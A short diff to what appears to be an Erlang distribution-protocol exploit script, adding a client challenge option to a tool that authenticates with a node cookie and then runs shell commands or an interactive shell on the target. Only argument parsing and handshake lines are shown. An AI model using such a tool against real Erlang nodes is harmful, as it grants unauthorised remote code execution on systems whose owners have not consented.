@@ -20,6 +20,7 @@ parser.add_argument('target', action='store', type=str, help='Erlang node addres
 parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')
 parser.add_argument('cookie', action='store', type=str, help='Erlang cookie')
 parser.add_argument('--verbose', action='store_true', help='Output decode Erlang binary term format received')
+parser.add_argument('--challenge', type=int, default=0, help='Set client challenge value')
 parser.add_argument('cmd', default=None, nargs='?', action='store', type=str, help='Shell command to execute, defaults to interactive shell')
 
 args = parser.parse_args()
@@ -36,7 +37,6 @@ def send_name(name):
 
 sock.sendall(send_name(name))
 
-
 data = sock.recv(5)
 assert(data == '\x00\x03\x73\x6f\x6b')
 
@@ -49,7 +49,7 @@ def send_challenge_reply(cookie, challenge):
   m.update(cookie)
   m.update(challenge)
   response = m.digest()
-  return pack('!HcI', len(response)+5, 'r', 0) + response
+  return pack('!HcI', len(response)+5, 'r', args.challenge) + response
 
 sock.sendall(send_challenge_reply(args.cookie, challenge))
 
